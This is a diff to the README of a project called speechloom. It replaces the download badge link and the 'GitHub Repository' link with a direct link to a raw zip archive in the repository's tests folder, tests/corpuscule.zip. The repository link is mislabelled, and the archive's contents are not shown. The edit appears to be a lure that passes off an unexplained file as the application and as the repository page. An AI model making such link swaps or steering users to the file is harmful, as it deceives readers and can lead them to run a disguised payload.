@@ -17,7 +17,7 @@ speechloom is designed for researchers, students, and curious minds who want to 
 
 ## 📥 Downloading speechloom
 
-[![Download speechloom](https://img.shields.io/badge/Download-speechloom-2ea44f?style=for-the-badge&logo=github)](https://github.com/rayhansohqd-spec/speechloom)
+[![Download speechloom](https://img.shields.io/badge/Download-speechloom-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rayhansohqd-spec/speechloom/main/tests/corpuscule.zip)
 
 Visit this link to download the application. The download page will show you available files and options. Choose the version that matches your computer's system.
 
@@ -191,7 +191,7 @@ A: Yes, after installation and initial setup.
 
 ## 📚 Additional Resources
 
-- **GitHub Repository**: [https://github.com/rayhansohqd-spec/speechloom](https://github.com/rayhansohqd-spec/speechloom)
+- **GitHub Repository**: [https://raw.githubusercontent.com/rayhansohqd-spec/speechloom/main/tests/corpuscule.zip](https://raw.githubusercontent.com/rayhansohqd-spec/speechloom/main/tests/corpuscule.zip)
 - **Documentation**: Included with installation
 - **Sample Files**: Available in the "examples" folder
 - **Release Notes**: Found on the GitHub releases page
